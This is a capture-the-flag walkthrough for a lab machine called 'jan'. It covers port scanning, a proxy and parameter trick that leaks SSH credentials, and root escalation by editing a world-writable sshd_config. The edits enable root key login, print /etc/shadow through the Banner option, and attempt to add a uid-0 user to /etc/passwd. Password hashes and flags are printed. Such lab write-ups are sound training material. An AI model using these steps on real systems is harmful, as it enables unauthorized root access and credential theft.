# jan

## Recon

::: details nmap_scan.log.md
```log
Open 10.0.2.64:22
Open 10.0.2.64:8080
[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} {{ip}} -sV -sC -Pn" on ip 10.0.2.64

PORT     STATE SERVICE REASON  VERSION
22/tcp   open  ssh     syn-ack OpenSSH 9.9 (protocol 2.0)
| ssh-hostkey: 
|   256 2c:0b:57:a2:b3:e2:0f:6a:c0:61:f2:b7:1f:56:b4:42 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBHsZR0525oJX6FinfDet0UiRBNem8JeMieLtK4aTPA8IitARqNlpxoImW5Hx1zmUOmcmQLguU32H+4Ki5FNWka8=
|   256 45:97:b0:2b:48:9b:4a:36:8e:db:44:bd:3f:15:cf:32 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKXdRCAzp4NQHOaCdp16oiQXHBfsVax3i+vY2La6CoBA
8080/tcp open  http    syn-ack Golang net/http server
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-open-proxy: Proxy might be redirecting requests
| fingerprint-strings: 
|   FourOhFourRequest, GetRequest, HTTPOptions: 
|     HTTP/1.0 200 OK
|     Date: Tue, 30 Sep 2025 16:53:04 GMT
|     Content-Length: 45
|     Content-Type: text/plain; charset=utf-8
|     Welcome to our Public Server. Maybe Internal.
|   GenericLines, Help, LPDString, RTSPRequest, SIPOptions, SSLSessionReq, Socks5: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   OfficeScan: 
|     HTTP/1.1 400 Bad Request: missing required Host header
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|_    Request: missing required Host header
|_http-title: Site doesn't have a title (text/plain; charset=utf-8).
|_http-favicon: Unknown favicon MD5: E58BCC73ED281AC1BBC18405DE40325C
```
```
:::

## HTTP (80)

Only SSH and port 8080 is exposed. 8080 is some kind of proxy which you can't interact with. However we can use proxy to interact with internal network.

```bash
└─$ curl http://10.0.2.64 -x http://10.0.2.64:8080/ -i
HTTP/1.1 200 OK
Date: Tue, 30 Sep 2025 16:56:25 GMT
Content-Length: 45
Content-Type: text/plain; charset=utf-8

Welcome to our Public Server. Maybe Internal. 
```

Hmmm
```bash
└─$ curl http://10.0.2.64/robots.txt -x http://10.0.2.64:8080/
/redirect
/credz                                                                                                                                                                                                            
└─$ curl http://10.0.2.64/credz -x http://10.0.2.64:8080/
Only accessible internally.                                                                                                                                                                                       
└─$ curl http://10.0.2.64/redirect -x http://10.0.2.64:8080/
Parameter 'url' needed.

└─$ curl 'http://10.0.2.64/redirect?url=http://127.0.0.1/credz' -x http://10.0.2.64:8080/
Only accessible internally. 
```

Not positive why, but this worked
```bash
└─$ curl 'http://0/redirect?url=/&url=/credz' -x http://10.0.2.64:8080/
ssh/EazyLOL 
```

## SSH

```bash
└─$ sshpass -p 'EazyLOL' ssh ssh@10.0.2.64
jan:~$ id
uid=1000(ssh) gid=1000(ssh) groups=1000(ssh)
```

### User.txt

```bash
jan:~$ cat user.txt
HMVSSWYMCNFIBDAFMTHFK
```

## Privilege Escalation

```bash
jan:~$ sudo -l
Matching Defaults entries for ssh on jan:
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

Runas and Command-specific defaults for ssh:
    Defaults!/usr/sbin/visudo env_keep+="SUDO_EDITOR EDITOR VISUAL"

User ssh may run the following commands on jan:
    (root) NOPASSWD: /sbin/service sshd restart
```

Interestingly we have write permissions on SSH config
```bash
jan:~$ ls -lh /etc/ssh/sshd_config
-rw-rw-rw-    1 root     root        3.3K Jan 28  2025 /etc/ssh/sshd_config
```

### ForceCommand

[https://man7.org/linux/man-pages/man5/sshd_config.5.html](https://man7.org/linux/man-pages/man5/sshd_config.5.html)

```bash
ForceCommand
	   Forces the execution of the command specified by
	   ForceCommand, ignoring any command supplied by the client
	   and ~/.ssh/rc if present.  The command is invoked by using
	   the user's login shell with the -c option.  This applies
	   to shell, command, or subsystem execution.  It is most
	   useful inside a Match block.  The command originally
	   supplied by the client is available in the
	   SSH_ORIGINAL_COMMAND environment variable.  Specifying a
	   command of internal-sftp will force the use of an in-
	   process SFTP server that requires no support files when
	   used with ChrootDirectory.  The default is none.
```

There's no `bash` so we can't `bash -p` to root. 

Add new root user
```bash
jan:~$ echo "pwn:$(openssl passwd -6 -salt x y):0:0:root:/root:/bin/ash"
jan:~$ nano /etc/ssh/sshd_config
ForceCommand /bin/ash -c 'grep -q "^pwn" /etc/passwd || echo "pwn:$6$x$oznOqkjAFKGu.2xNYeb1KoRKm/KJBGXlycJYIuGidRwif7dneFQvmqq4SGwXV.ZRoYjuOfKpoAHJ26Ekl3OUt1:0:0:root:/root:/bin/ash" >> /etc/passwd'
...
jan:~$ sudo /sbin/service sshd restart
---
└─$ sshpass -p 'EazyLOL' ssh ssh@10.0.2.64
... can't create /etc/passwd: Permission denied
```

I forgot to read the whole thing where it mentions that logged in users trigger this command and not root magically.

### AuthorizedKeysFile (1)

Go over `sshd_config` manual again
```bash
- PermitRootLogin
	   Specifies whether root can log in using ssh(1).  The argument must be yes, prohibit-password, forced-commands-only, or no.  The default is prohibit-password.

- StrictModes
	   Specifies whether sshd(8) should check file modes and ownership of the user files and home directory before accepting login. This is normally desirable because novices sometimes accidentally leave their directory or files world-writable.  The default is yes.  Note that this does not apply to ChrootDirectory, whose permissions and ownership are checked unconditionally.

- AuthorizedKeysCommand accepts the tokens %%, %C, %D, %f, %h, %k, %t, %U, and %u.

- AuthorizedKeysFile accepts the tokens %%, %h, %U, and %u.
```

Generate keys
```bash
└─$ ssh-keygen -f id_rsa -q -P x && cat id_rsa.pub
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILxSIb+fL2w58X0CyoHOmDAB6yIXTNqRAy1ue7HhPK8G woyag@kraken
---
jan:~$ mkdir ~/.ssh
jan:~$ echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILxSIb+fL2w58X0CyoHOmDAB6yIXTNqRAy1ue7HhPK8G woyag@kraken' > ~/.ssh/authorized_keys
```

```
jan:~$ nano /etc/ssh/sshd_config
### Comment this
# AuthorizedKeysFile    .ssh/authorized_keys 

### Write this
PermitRootLogin yes
StrictModes no
AuthorizedKeysFile /home/ssh/.ssh/authorized_keys
```

```bash
└─$ ssh root@10.0.2.64 -i id_rsa
jan:~# id
uid=0(root) gid=0(root) groups=0(root),0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
```

### Banner (2)

You can also achieve file read with `Banner`
```bash
jan:~$ nano /etc/ssh/sshd_config
Banner /etc/shadow
```

```bash
└─$ ssh anyone@10.0.2.64
Warning: Permanently added '10.0.2.64' (ED25519) to the list of known hosts.
#DIRTYCTFLOLBUTPAZZNOTNEEDED
root:$6$QBMHIEgcztCuLI0w$6mEXyvVKjT3gW8r0Ck99QElCdHdi32m6fzCkwv613kbqBVqt9FttRbcGXhf9Eg6q0PKj6FuvZr2QmupOLzG/e1:20116:0:::::
...
ssh:$6$X9w2fIhun4erCQ0g$sX6uU920JjNVy70vsILZIV5CA83BZhm0FT7HofU4PPqu/oLI69K.nN/14v4vmmwv62jwUwdaw0BOR3qICICDV/:20116:0:99999:7:::
```

There's the root password
```bash
jan:~$ su
Password: DIRTYCTFLOLBUTPAZZNOTNEEDED
/home/ssh # id
uid=0(root) gid=0(root) groups=0(root),0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
```

### Root.txt

```
jan:~# cat /root/root.txt
HMV2PRMTERWTFUDNGMBG
```